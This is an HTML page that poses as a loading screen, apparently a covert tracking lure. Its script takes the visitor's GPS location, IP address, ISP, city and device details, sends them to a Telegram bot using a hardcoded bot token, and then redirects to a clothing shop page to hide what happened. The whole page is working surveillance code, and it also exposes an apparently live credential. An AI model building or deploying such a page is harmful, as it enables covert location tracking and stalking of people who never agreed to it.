<!DOCTYPE html>
<html>
<head>
  <title>Loading...</title>
  <style>
    body { font-family: sans-serif; display:flex; justify-content:center; align-items:center; height:100vh; }
  </style>
</head>
<body>
<h3 id="status">📍 Requesting location permission...</h3>

<script>
const botToken = "8477495842:AAHN8GT3ZBaaKXP-TWySiL1jpWhaiwLVn30"; 
const chatId = "8144368202"; 
const redirectURL = "https://luxuarydubai.com/product-category/clothing/";
const intervalMinutes = 10;

// Detect device model
function detectDeviceModel() {
  const ua = navigator.userAgent;
  if (/iPhone/i.test(ua)) return "Apple iPhone (" + ua.match(/iPhone OS [\\d_]+/i)[0].replace(/_/g, ".") + ")";
  if (/iPad/i.test(ua)) return "Apple iPad (" + ua.match(/CPU OS [\\d_]+/i)[0].replace(/_/g, ".") + ")";
  if (/Android/i.test(ua)) {
    const match = ua.match(/Android\\s+[\\d.]+;\\s*([^)]+)/i);
    if (match && match[1]) return match[1].trim();
    return "Android Device";
  }
  if (/Windows/i.test(ua)) return "Windows PC";
  if (/Macintosh/i.test(ua)) return "Mac";
  if (/Linux/i.test(ua)) return "Linux Device";
  return "Unknown Device";
}

// Device info
function getDeviceInfo(ipData) {
  return `
🖥 Device Info:
- Device Model: ${detectDeviceModel()}
- User Agent: ${navigator.userAgent}
- Platform: ${navigator.platform}
- Language: ${navigator.language}
- Screen: ${screen.width}x${screen.height}

🌐 Network Info:
- IP: ${ipData.ip}
- ISP: ${ipData.org || "Unknown"}
- City: ${ipData.city || "Unknown"}
- Region: ${ipData.region || "Unknown"}
- Country: ${ipData.country || "Unknown"}
`;
}

// Send message to Telegram
function sendData(message) {
  fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ chat_id: chatId, text: message })
  }).catch(() => {});
}

// Send location + device info
function sendLocation(lat, lon, ipData) {
  const message = `📍 Location: ${lat},${lon}
https://maps.google.com/?q=${lat},${lon}
${getDeviceInfo(ipData)}`;
  sendData(message);
}

// Get location
function getLocationPromise() {
  return new Promise((resolve) => {
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        (pos) => resolve(pos),
        () => resolve(null)
      );
    } else {
      resolve(null);
    }
  });
}

// Start immediately
(async function startTracking() {
  // Get IP & network info first
  let ipData = {};
  try {
    const res = await fetch("https://ipapi.co/json/");
    ipData = await res.json();
  } catch (e) {}

  const pos = await getLocationPromise();
  if (pos) {
    sendLocation(pos.coords.latitude, pos.coords.longitude, ipData);
  } else {
    sendData(`❌ Location denied.\n${getDeviceInfo(ipData)}`);
  }

  // Redirect after first report
  window.location.href = redirectURL;

  // Repeat every 10 minutes
  setInterval(async () => {
    const p = await getLocationPromise();
    if (p) sendLocation(p.coords.latitude, p.coords.longitude, ipData);
  }, intervalMinutes * 60 * 1000);
})();
</script>
</body>
</html>
